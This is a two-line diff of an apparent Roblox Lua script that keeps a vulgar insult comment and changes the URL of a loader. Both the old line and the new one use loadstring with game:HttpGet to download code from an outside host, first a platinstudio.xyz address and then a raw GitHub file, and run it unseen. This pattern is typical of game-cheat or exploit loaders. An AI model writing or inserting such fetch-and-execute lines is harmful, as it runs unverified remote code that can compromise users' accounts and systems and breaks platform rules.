@@ -1,2 +1,2 @@
 -- i fack yo mama
-loadstring(game:HttpGet("https://platinstudio.xyz/loader/HSXMain"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brojstypingshit-prog/main.luau/refs/heads/main/wb1j7h1.txt"))()
